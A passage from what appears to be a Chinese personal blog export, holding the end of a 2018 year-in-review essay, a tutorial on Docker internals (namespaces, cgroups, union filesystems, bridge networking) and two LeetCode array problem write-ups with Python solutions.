<p>　　这一年里，在学习和科研上没有太多让人兴奋的故事，也没有取得什么拿得出手的成就。平时，那还真是平平淡淡，每天按时打卡“上下班”，顺利结束了研究生的所有课程，很多课程都拿到了还算漂亮的成绩，也顺利找到了自己的研究方向，完成了研究生的毕业论文开题。当然，这些平凡的日日夜夜，也让我越来越明白，如果能够认真、坚持去做一些事情，不负青春，不负自己，总会有人欣赏你。感觉这一年里，在学习和科研上最有意义两件事情，一是，停更半年的博客，我又下定决心要坚持写。现在翻看这些博客，半年时间，记录了很多很多生活和学习的点滴，作为我生活的一部分，当初写下的这些文字，现在看起来真的很生动，内心满满的幸福感。二是，暑假匆匆而来，又匆匆离去的第二次北京之行。参加边缘计算的课程，在中国计算机最核心的地带，见识了很多学术大牛，见证了帝都的深厚的历史文化底蕴，感受了繁华都市里充满生机与活力的氛围，也了解了北漂一族的不易。最后，面对令人充满了敬意的帝都的一切，面对和长沙的不一样所引发的深层思考，让我更深刻地意识到还是要多出去走走看看，也要学会多记录自己的生活点滴。</p>
<p>　　这一年来，博士师兄出国后，感觉自己在团队中承担的东西也越来越多。我需要配合导师安排组里的各种事情，有时候要协调各种关系，还要替导师思考一些问题。同时，我还当上了导师的课程助教，花了很多的时间来处理课程上的事情。但是，自己的科研也一直没有什么进展，摇摆不定的科研方向，没有得到太多的指导。虽然导师这样的培养方式可以让我们更自由地去探索，对各个领域都有所了解。但是，这样同样也让我们无法深入地做研究。相比于某些导师的学生，我们真是有些可怜。说起来，这其中也受过很多气，面对某些人无休止的秀自己的成果，而自己也只能忍气吞声。以前，总以为这个世界可以纯净如雪，可是，现实却往往浑浊不堪。后来，看多了水文章的，了解了学术圈阴暗的一面，也习惯了别人的冷嘲热讽，慢慢地也就很释然了。现在，我只想着好好做好自己该做的事情，不忘初心，方得始终啊。</p>
<p>　　这一年里，我也利用空闲时间看了一些书，有开阔视野的吴军先生的《见识》和吴晓波的《腾讯传》，有生活有故事的刘若英的《我敢在你怀里孤独》和柴静的《看见》；还有国内的小说，张嘉佳的《从你的全世界路过》和《云边有个小卖部》，国外的小说《偷影子的人》、《挪威的森林》和《人间失格》；以及心理学方面的《少有人走的路》，经济学方面的《菜场经济学》，也有历史方面的《明朝那些事儿》和《半小时漫画中国史》系列。生活其实是一面镜子，照出来的是你自己，书也是。在书中我看到了不一样的世界，看到了自己想要的生活，也从书中明白了很多的道理。甚至说，有些书给了我很多指引，也给了我前进的动力。虽然各种书籍都有所涉猎，但是读书的时间还是不够多。所以，以后我也还是要坚持多看书。另外，真是可惜了，这一年少走了一些路，曾经的旅行计划因为很多原因都没有实施。2019 年希望可以出去走走，带上我爱的人，去自己想去的地方看看。</p>
<p>　　总结起来，这一年，也发现自己慢慢长大了。经历过很多事情，也遇到过很多怀疑自己的时刻，我也认真反思过。曾经，对于身边的人，什么事都喜欢多说几句，特喜欢从自己的角度去分析，然后教育别人；可是，现在也发现，与其这么担心别人，还不如自己好好提升自我。所有的言辞，都不如实际的成就来得实在，只有你让别人钦佩，别人才会相信你说的话啊。曾经，也看到人心浮躁，遇到困难就想退缩，总觉得换个环境或者换种方式就会更好。现在，我也明白，他们只是不曾想过换了以后，又会遇到不一样的困难，然后才会想着要换，所以其实一直就是在逃避。曾经，不太懂得珍惜真正对自己好的人。现在，也慢慢明白，不应该让对你的好的人满载失望离开。曾经，因为说错话，被教育：你没有错，你只是太真实了。现在，我也明白情商真的非常非常重要，真的是所谓的，和什么样的人说什么样的话，在合适的时候说合适的话。曾经，因为过于爱惜自己的羽毛，不愿意出手相助，而让别人错失机会。现在，我也觉得开始反思这样的行为，应该尽己所能去帮助别人。曾经……现在……</p>
<p>　　这一年，忙忙碌碌，很遗憾，回去的时间真的很少很少，和家人在一起的时间也少得可怜。但是，我也很知足，家人也都健健康康，一切都挺好。也希望，2019，我的家人都可以健健康康、平平安安。现在，女朋友给我潜移默化的影响，让我更深刻地意识到家人的重要，在外面也要经常和家人练习，有时间要更多地陪陪家人。另外，很多的关系也没有很好地去维护。一方面，自己专注在做一些事情，也就没有了那么多叙旧的时间。另一方面，现在自己也越来越觉得身体是最重要的，所以出去海吃海和越来越少，与一些好朋友在一起的机会也就越来越少。庆幸的是，虽然聚会的机会很少，但是我们的关系却也没有因此变得更淡，平时也还是能够聊到很多有意思的话题。那些难得一聚的机会，让我们更加珍惜。作为好朋友，可以听听你们和我分享工作和生活，见证着你们的笑容、幸福和成长，亦或是体会到你们的艰辛、困难和迷茫。真的，有你们我就很知足，希望，新的一年里，你们都可以顺顺利利。</p>
<p>　　2018，谢谢你们一直都在，也谢谢你们的陪伴。2019，本命年啊，也希望我一切都能顺心顺意！希望自己的小目标都可以顺利实现，希望能够多发paper。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/1/1-1.jpg" alt="1-1"></p>
<p>　　也希望互联网寒冬之下，找工作可以一切顺利；</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/1/1-2.jpg" alt="1-2"></p>
<p>　　更希望，我和某只小可爱能够一直好好地走下去。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/1/1-3.jpg" alt="1-3"></p>
<p>　　借用习主席的新年贺词，我们都在努力奔跑，我们都是追梦人。2019 有机遇也有挑战，大家还要一起拼搏，一起奋斗。2019，愿每一个爱我的人和我爱的人，都能被岁月温柔以待。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 技术原理与实践</title>
    <url>/2018/12/27/Docker-%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<p><center>Docker 技术原理与实践介绍。</center><br><a id="more"></a></p>
<h4 id="Docker-简介"><a href="#Docker-简介" class="headerlink" title="Docker 简介"></a>Docker 简介</h4><p>　　Docker 是基于容器技术的开源轻量级虚拟化解决方案，诞生于 2013 年初，基于 Google 公司推出的 Go 语言实现。Docker 是容器引擎，把 Linux 的 Cgroup、Namespace 等容器底层技术进行封装抽象，为用户提供了创建和管理容器的便捷界面（包括命令行和 API）。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-1.jpg" alt="27-1"></p>
<h5 id="容器与虚拟机"><a href="#容器与虚拟机" class="headerlink" title="容器与虚拟机"></a>容器与虚拟机</h5><p>　　虚拟机在本质上就是在模拟一台真实的计算机设备，同时遵循同样的程序执行方式。虚拟机能够利用“虚拟机管理程序”运行在物理设备之上。反过来，虚拟机管理程序则可运行在主机设备或者“裸机”之上。</p>
<p>　　运行在主机设备上的虚拟机（当然，需要配合虚拟机管理程序）通常被称为一套“客户机”。这套客户机容纳有应用程序及其运行所必需的各类组件（例如系统二进制文件及库）。它同时还包含有完整的虚拟硬件堆栈，其中包括虚拟网络适配器、存储以及CPU——这意味着它也拥有自己的完整访客操作系统。着眼于内部，这套客户机自成体系并拥有专用资源。而从外部来看，这套虚拟机使用的则是由主机设备提供的共享资源。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-2.png" alt="27-2"></p>
<p>　　与提供硬件虚拟化机制的虚拟机不同，容器通过对“用户空间”的抽象化处理提供操作系统层级的虚拟化机制。容器与虚拟机间的最大区别在于，各容器系统共享主机系统的内核。</p>
<h5 id="容器的优势与不足"><a href="#容器的优势与不足" class="headerlink" title="容器的优势与不足"></a>容器的优势与不足</h5><ol>
<li><strong>容器与虚拟机比较：</strong></li>
</ol>
<table>
<thead>
<tr>
<th>特性</th>
<th>容器</th>
<th>虚拟机</th>
</tr>
</thead>
<tbody>
<tr>
<td>启动</td>
<td>秒级</td>
<td>分钟级</td>
</tr>
<tr>
<td>硬盘使用</td>
<td>一般为 MB</td>
<td>一般为 GB</td>
</tr>
<tr>
<td>性能</td>
<td>接近原生</td>
<td>弱于原生</td>
</tr>
<tr>
<td>系统支持量</td>
<td>单机支持上千个容器</td>
<td>一般几十个</td>
</tr>
</tbody>
</table>
<ol>
<li><strong>容器的优势</strong></li>
</ol>
<ul>
<li>更快速的交付和部署：开发人员可以使用镜像快速的构建标准开发环境；开发完成后，测试和运维人员可以使用开发人员提供的 Docker 镜像快速部署应用，可以避免开发和测试运维人员之间的环境差异导致的部署问题。</li>
<li>更高效的资源利用：Docker 容器的运行不需要额外的虚拟化管理程序支持，它是内核级的虚拟化，在占用更少资源的情况实现更高的性能。</li>
<li>更方便的迁移和扩展：Docker 容器几乎可以在任意的平台上运行，包括物理机、虚拟机、公有云、私有云、服务器等。这种兼容使得用户可以在不同的平台之间很方便的完成应用迁移。</li>
<li>更简单的更新管理。使用 Dockerfile，只需要小小的配置修改，就可以替代以往大量的更新工作，并且所有修改都以增量方式进行分发和更新。</li>
</ul>
<ol>
<li><strong>容器的不足</strong></li>
</ol>
<ul>
<li>资源隔离方面不如虚拟机，Docker 是利用 Cgroup 实现资源限制的，只能限制资源消耗的最大值，而不能隔绝其他程序占用自己的资源。 </li>
<li>安全性问题。Docker 目前并不能分辨具体执行指令的用户，只要一个用户拥有执行 Docker 的权限，那么他就可以对 Docker 的容器进行所有操作，不管该容器是否是由该用户创建。</li>
<li>Docker 目前还在版本的快速更新中，细节功能调整比较大。一些核心模块依赖于高版本内核，存在版本兼容问题。</li>
</ul>
<h5 id="Docker-基本概念"><a href="#Docker-基本概念" class="headerlink" title="Docker 基本概念"></a>Docker 基本概念</h5><ul>
<li><strong>镜像：</strong>操作系统分为内核和用户空间。对于 Linux 而言，内核启动后，会挂载 root 文件系统为其提供用户空间支持。而Docker 镜像（Image） ，就相当于是一个 root 文件系统。</li>
</ul>
<p>　　Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等） 。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p>
<ul>
<li><strong>容器：</strong>镜像（Image ） 和容器（Container ） 的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</li>
</ul>
<p>　　容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的命名空间。因此容器可以拥有自己的 root 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。 </p>
<ul>
<li><strong>仓库：</strong>集中的存储、分发镜像的服务（Docker Registry）。通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本。</li>
</ul>
<p>　　Docker 仓库分为公有和私有。最常使用的公有仓库是官方的 Docker Hub，这也是默认的仓库，并拥有大量的高质量的官方镜像。用户还可以搭建私有 Docker 仓库。Docker 官方提供了Docker 仓库镜像，可以直接使用做为私有仓库服务。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-3.png" alt="27-3"></p>
<h5 id="Docker-结构引擎"><a href="#Docker-结构引擎" class="headerlink" title="Docker 结构引擎"></a>Docker 结构引擎</h5><p>　　Docker是一个客户端/服务器（C/S）架构的程序，Docker客户端只需向Docker服务器或守护进程（有时也称为Docker引擎）发出请求，服务器或守护进程将完成所有工作并返回结果。</p>
<ul>
<li>Server，就是一个守护进程，它会一直运行在后台；</li>
<li>REST API，说明如何与server交互和指示它执行命令；</li>
<li>Client，是客户写指令的地方，也俗称shell；</li>
<li>Network，俗称网络，容器通过暴露端口与主机端口绑定，达到接受来自主机的信号；</li>
<li>Volume，俗称外挂，为了能够持久化数据以及共享容器间的数据，Docker提出了Volume的概念。</li>
</ul>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-4.png" alt="27-4"></p>
<h5 id="Docker-运行流程"><a href="#Docker-运行流程" class="headerlink" title="Docker 运行流程"></a>Docker 运行流程</h5><ol>
<li>拉取镜像，若本地已经存在该镜像，则不用到网上去拉取；</li>
<li>创建新的容器；</li>
<li>分配union文件系统并且挂着一个可读写的层，任何修改容器的操作都会被记录在这个读写层上，你可以保存这些修改成新的镜像，也可以选择不保存，那么下次运行改镜像的时候所有修改操作都会被消除；</li>
<li>分配网络\桥接接口，创建一个允许容器与本地主机通信的网络接口；</li>
<li>设置ip地址，从池中寻找一个可用的ip地址附加到容器上，换句话说，localhost并不能访问到容器；</li>
<li>运行程序；</li>
<li>捕获并且提供应用输出，包括输入、输出、报错信息。</li>
</ol>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-5.png" alt="27-5"></p>
<h4 id="Docker-核心技术"><a href="#Docker-核心技术" class="headerlink" title="Docker 核心技术"></a>Docker 核心技术</h4><h5 id="命名空间（Namespaces）"><a href="#命名空间（Namespaces）" class="headerlink" title="命名空间（Namespaces）"></a>命名空间（Namespaces）</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-6.png" alt="27-6"></p>
<p>　　命名空间是 Linux 提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法。当服务器上启动了多个服务时，这些服务其实会相互影响的，每一个服务都能看到其他服务的进程，也可以访问宿主机器上的任意文件，我们希望运行在同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样。</p>
<p>　　Linux 的命名空间机制提供了七种不同的命名空间：</p>
<ul>
<li><strong>PID 命名空间</strong>。不同用户的进程通过 PID 命名空间隔离，且不同命名空间中可以有相同 PID 。所有的 LXC 进程在 Docker 中的父进程为 Docker 进程，每个 LXC 进程具有不同的命名空间。同时由于允许嵌套，因此可以很方便的实现嵌套的 Docker 容器。</li>
<li><strong>NET 命名空间</strong>。 网络隔离是通过 NET 命名空间实现的，每个 NET 命名空间有独立的网络设备，IP 地址，路由表，/proc/net 目录。Docker 默认采用 veth 的方式，将容器中的虚拟网卡同 host 上的一 个Docker 网桥 docker0 连接在一起。</li>
<li><strong>IPC 命名空间</strong>。容器中进程交互采用 Linux 常见的进程间通信方法（IPC），包括信号量、消息队列和共享内存等。然而与 VM 不同的是，容器的进程间交互实际上还是 host 上具有相同 PID 命名空间中的进程间交互，因此需要在 IPC 资源申请时加入命名空间信息，每个 IPC 资源有一个唯一的 32 位 ID。</li>
</ul>
<p>　　此外，还有：挂载命名空间、UTS 命名空间、用户命名空间。</p>
<p>　　Docker 其实就通过 Linux 的 Namespaces 对不同的容器实现了隔离。每个容器有自己单独的命名空间，运行在其中的应用都像是在独立的操作系统中运行一样。</p>
<h5 id="控制组（Control-groups）"><a href="#控制组（Control-groups）" class="headerlink" title="控制组（Control groups）"></a>控制组（Control groups）</h5><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-7.png" alt="27-7"></p>
<p>　　通过 Linux 的命名空间为新创建的进程隔离了文件系统、网络并与宿主机器之间的进程相互隔离，但是命名空间并不能够为我们提供物理资源上的隔离，比如 CPU 或者内存。</p>
<p>　　如果其中的某一个容器正在执行 CPU 密集型的任务，那么就会影响其他容器中任务的性能与执行效率，导致多个容器相互影响并且抢占资源。如何对多个容器的资源使用进行限制就成了解决进程虚拟资源隔离之后的主要问题，而 Control Groups（简称 CGroups）就是能够隔离宿主机器上的物理资源，例如 CPU、内存、磁盘 I/O 和网络带宽。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-8.png" alt="27-8"></p>
<p>　　Cgroups 是Linux 内核的一个特性，主要用来对共享资源进行隔离、限制、审计等。只有能控制分配到容器的资源，才能避免当多个容器同时运行时的对系统资源的竞争。</p>
<p>　　Linux 的 Cgroups 能够为一组进程分配资源，即 CPU、内存、网络带宽等资源，通过对资源的分配，CGroup 能够提供以下的几种功能：</p>
<ul>
<li>限制资源使用，比如内存使用上限以及文件系统的缓存限制。</li>
<li>优先级控制，通过优先级让一些组优先得到更多到CPU等资源。</li>
<li>一些审计或一些统计，主要目的是为了计费。</li>
<li>挂起进程，恢复执行进程。</li>
</ul>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-9.png" alt="27-9"></p>
<p>　　每一个 Cgroup 都是一组被相同的标准和参数限制的进程，不同的 Cgroup 之间是有层级关系的，它们之间可以从父类继承一些用于限制资源使用的标准和参数。</p>
<p>　　在 CGroup 中，所有的任务就是一个系统的一个进程，而 CGroup 就是一组按照某种标准划分的进程，在 CGroup 这种机制中，所有的资源控制都是以 CGroup 作为单位实现的，每一个进程都可以随时加入一个 CGroup 也可以随时退出一个 CGroup。</p>
<p>　　Linux 的命名空间和控制组分别解决了不同资源隔离的问题，前者解决了进程、网络以及文件系统的隔离，后者实现了 CPU、内存等资源的隔离，但是在 Docker 中还有另一个非常重要的问题需要解决 - 也就是镜像。</p>
<h5 id="联合文件系统（Union-File-Systems）"><a href="#联合文件系统（Union-File-Systems）" class="headerlink" title="联合文件系统（Union File Systems）"></a>联合文件系统（Union File Systems）</h5><p>　　当镜像被 docker run 命令创建时就会在镜像的最上层添加一个可写的层，也就是容器层，所有对于运行时容器的修改其实都是对这个容器读写层的修改。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-10.png" alt="27-10"></p>
<p>　　容器和镜像的区别就在于，所有的镜像都是只读的，而每一个容器其实等于镜像加上一个可读写的层，也就是同一个镜像可以对应多个容器。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-11.png" alt="27-11"></p>
<p>　　AUFS（Advanced UnionFS）是 UnionFS 的升级版，它能够将不同文件夹中的层联合到同一个文件夹中，这些文件夹在 AUFS 中称作分支，整个联合的过程被称为联合挂载（Union Mount）：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-12.png" alt="27-12"></p>
<p>　　所有镜像层和容器层的内容都存储在 /var/lib/docker/aufs/diff/ 目录中。而 /var/lib/docker/aufs/layers/ 中存储着镜像层的元数据，每一个文件都保存着镜像层的元数据，最后的 /var/lib/docker/aufs/mnt/ 包含镜像或者容器层的挂载点，最终会被 Docker 通过联合的方式进行组装。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-13.png" alt="27-13"></p>
<p>　　每一个镜像层都是建立在另一个镜像层之上的，同时所有的镜像层都是只读的，只有每个容器最顶层的容器层才可以被用户直接读写，所有的容器都建立在一些底层服务（Kernel）上。这种容器的组装方式提供了非常大的灵活性，只读的镜像层通过共享也能够减少磁盘的占用。</p>
<h5 id="Linux-网络虚拟化"><a href="#Linux-网络虚拟化" class="headerlink" title="Linux 网络虚拟化"></a>Linux 网络虚拟化</h5><p>　　每一个使用 docker run 启动的容器其实都具有单独的网络命名空间，Docker 提供了四种不同的网络模式：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-14.png" alt="27-14"></p>
<p><img src="" alt=""></p>
<p>　　如果 Docker 的容器通过 Linux 的命名空间完成了与宿主机进程的网络隔离，但是却有没有办法通过宿主机的网络与整个互联网相连，就会产生很多限制，所以 Docker 虽然可以通过命名空间创建一个隔离的网络环境，但是 Docker 中的服务仍然需要与外界相连才能发挥作用。</p>
<p>　　Docker 通过 Linux 的命名空间实现了网络的隔离，又通过 iptables 进行数据包转发，让 Docker 容器能够优雅地为宿主机器或者其他容器提供服务。</p>
<p><img src="" alt=""></p>
<p>　　网桥模式下，除了分配隔离的网络命名空间之外，Docker 还会为所有的容器设置 IP 地址。当 Docker 服务器在主机上启动之后会创建新的虚拟网桥 docker0，随后在该主机上启动的全部服务在默认情况下都与该网桥相连。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2018/12/27-15.png" alt="27-15"></p>
<p>　　网桥是在内核中虚拟出来的，可以将主机上真实的物理网卡，或虚拟的网卡桥接上来。桥接上来的网卡就相当于网桥上的端口。 端口收到的数据包都提交给这个虚拟的网桥，让其进行转发。</p>
<p>　　在默认情况下，每一个容器在创建时都会创建一对虚拟网卡，两个虚拟网卡组成了数据的通道，其中一个会放在创建的容器中，会加入到名为 docker0 网桥中。docker0 会为每一个容器分配一个新的 IP 地址并将 docker0 的 IP 地址设置为默认的网关。网桥 docker0 通过 iptables 中的配置与宿主机器上的网卡相连，所有符合条件的请求都会通过 iptables 转发到 docker0 并由网桥分发给对应的机器。</p>
<p>　　<strong>参考资料：</strong></p>
<p><a href="http://dockone.io/article/2941" target="_blank" rel="external">[1] Docker 核心技术与实现原理</a></p>
<p><a href="https://www.jianshu.com/p/7a58ad7fade4" target="_blank" rel="external">[2] Docker 原理篇</a></p>
<p><a href="https://github.com/yeasy/docker_practice" target="_blank" rel="external">[3] Docker — 从入门到实践</a></p>
<p><a href="https://github.com/jaywcjlove/docker-tutorial" target="_blank" rel="external">[4] Docker入门学习笔记</a></p>
]]></content>
      <categories>
        <category>Cloud/Edge Computing</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 167. Two Sum II - Input array is sorted</title>
    <url>/2018/12/25/LeetCode-167-Two-Sum-II-Input-array-is-sorted/</url>
    <content><![CDATA[<center>LeetCode 167. Two Sum II - Input array is sorted 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given an array of integers that is already <strong>sorted in ascending order</strong>, find two numbers such that they add up to a specific target number.</p>
<p>The function twoSum should return indices of the two numbers such that they add up to the target, where index1 must be less than index2.</p>
<p><strong>Note:</strong></p>
<ul>
<li>Your returned answers (both index1 and index2) are not zero-based.</li>
<li>You may assume that each input would have <em>exactly</em> one solution and you may not use the <em>same</em> element twice.</li>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个已按照<strong>升序排列</strong> 的有序数组，找到两个数使得它们相加之和等于目标数。</p>
<p>函数应该返回这两个下标值 index1 和 index2，其中 index1 必须小于 index2<em>。</em></p>
<p><strong>说明:</strong></p>
<ul>
<li>返回的下标值（index1 和 index2）不是从零开始的。</li>
<li>你可以假设每个输入只对应唯一的答案，而且你不可以重复使用相同的元素。</li>
</ul>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: numbers = [2, 7, 11, 15], target = 9</div><div class="line">输出: [1,2]</div><div class="line">解释: 2 与 7 之和等于目标数 9 。因此 index1 = 1, index2 = 2 。</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　遍历数组，然后使用字典，键为 <code>target-numbers[i]</code>，值为 <code>i</code> ，依次判断 <code>numbers[i]</code> 是否已经在字典中，如果是，则输出结果，即和为目标值的两个数。否则把 <code>target-numbers[i]</code> 的值存入字典。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, numbers, target)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type numbers: List[int]</div><div class="line">        :type target: int</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">        d = &#123;&#125;</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(numbers)):</div><div class="line">            x = target - numbers[i]  <span class="comment"># 判断是否已经在字典中</span></div><div class="line">            <span class="keyword">if</span> numbers[i] <span class="keyword">in</span> d:</div><div class="line">                <span class="keyword">return</span> d[numbers[i]] + <span class="number">1</span>, i + <span class="number">1</span>  <span class="comment"># 输出结果</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                d[x] = i  <span class="comment"># 存入字典</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　双指针思想。由于是排序数组，使用 i，j 两个游标从两端开始处理，每次计算两数之和，如果大于目标值，右边的游标 j 向左移，否则，左边的游标 i 向右移，逐步逼近目标值。直到等于目标值，再输出。注意，输出时要加 1，因为题目要求返回的下标值不是从零开始的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, numbers, target)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type numbers: List[int]</div><div class="line">        :type target: int</div><div class="line">        :rtype: List[int]</div><div class="line">        """</div><div class="line">        i = <span class="number">0</span></div><div class="line">        j = len(numbers) - <span class="number">1</span></div><div class="line">        <span class="keyword">while</span> i &lt; j:</div><div class="line">            tmp = numbers[i] + numbers[j]  <span class="comment"># 当前游标所指元素之和</span></div><div class="line">            <span class="keyword">if</span> tmp == target:</div><div class="line">                <span class="keyword">return</span> i + <span class="number">1</span>, j + <span class="number">1</span>  <span class="comment"># 输出结果</span></div><div class="line">            <span class="keyword">elif</span> tmp &lt; target:  <span class="comment"># 小于目标值</span></div><div class="line">                i += <span class="number">1</span>  <span class="comment"># 左边的游标右移</span></div><div class="line">            <span class="keyword">else</span>:  <span class="comment"># 大于目标值</span></div><div class="line">                j -= <span class="number">1</span>  <span class="comment"># 右边的游标左移</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 88. Merge Sorted Array</title>
    <url>/2018/12/24/LeetCode-88-Merge-Sorted-Array/</url>
    <content><![CDATA[<center>LeetCode 88. Merge Sorted Array 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Given two sorted integer arrays <em>nums1</em> and <em>nums2</em>, merge <em>nums2</em> into <em>nums1</em> as one sorted array.</p>
<p><strong>Note:</strong></p>
<ul>
<li>The number of elements initialized in <em>nums1</em> and <em>nums2</em> are <em>m</em> and <em>n</em> respectively.</li>
<li>You may assume that <em>nums1</em> has enough space (size that is greater or equal to <em>m</em> + <em>n</em>) to hold additional elements from <em>nums2</em>.</li>
<li><strong>中文：</strong> </li>
</ul>
<p>给定两个有序整数数组 <em>nums1</em> 和 <em>nums2</em>，将 <em>nums2</em> 合并到 <em>nums1</em> 中<em>，</em>使得 <em>num1</em> 成为一个有序数组。</p>
<p><strong>说明:</strong></p>
<ul>
<li>初始化 <em>nums1</em> 和 <em>nums2</em> 的元素数量分别为 <em>m</em> 和 <em>n</em>。</li>
<li>你可以假设 <em>nums1</em> 有足够的空间（空间大小大于或等于 <em>m + n</em>）来保存 <em>nums2</em> 中的元素。</li>
</ul>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入:</div><div class="line">nums1 = [1,2,3,0,0,0], m = 3</div><div class="line">nums2 = [2,5,6],       n = 3</div><div class="line"></div><div class="line">输出: [1,2,2,3,5,6]</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　思路很简单，先合并两个数组，再重新排序。注意，此题不需要返回。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(self, nums1, m, nums2, n)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums1: List[int]</div><div class="line">        :type m: int</div><div class="line">        :type nums2: List[int]</div><div class="line">        :type n: int</div><div class="line">        :rtype: void Do not return anything, modify nums1 in-place instead.</div><div class="line">        """</div><div class="line">        nums1[m:m + n] = nums2[:n]  <span class="comment"># 将 nums2 中的数复制到 nums1 的后面</span></div><div class="line">        nums1.sort()  <span class="comment"># 重新排序</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong> </li>
</ul>
<p>　　因为 nums1 的右端留有空位，而且两个数组都是排好序的，因此我们只要用两个指针，从两个数组的右端开始进行比较，得到较大的放到从 nums1 右边开始填充。最后如果 nums1 中已有的数都已经移动完成，而 nums2 中还有剩余，则直接将 nums2 的数复制到 nums1 的前面即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(self, nums1, m, nums2, n)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type nums1: List[int]</div><div class="line">        :type m: int</div><div class="line">        :type nums2: List[int]</div><div class="line">        :type n: int</div><div class="line">        :rtype: void Do not return anything, modify nums1 in-place instead.</div><div class="line">        """</div><div class="line">        i, j = m - <span class="number">1</span>, n - <span class="number">1</span>  <span class="comment"># 从右边开始比较</span></div><div class="line">        <span class="keyword">while</span> i &gt;= <span class="number">0</span> <span class="keyword">and</span> j &gt;= <span class="number">0</span>:  <span class="comment"># 直到最左边</span></div><div class="line">            <span class="keyword">if</span> nums1[i] &gt; nums2[j]:  <span class="comment"># 比较</span></div><div class="line">                nums1[i + j + <span class="number">1</span>] = nums1[i]  <span class="comment"># 填充预留的位置</span></div><div class="line">                i -= <span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                nums1[i + j + <span class="number">1</span>] = nums2[j]  <span class="comment"># 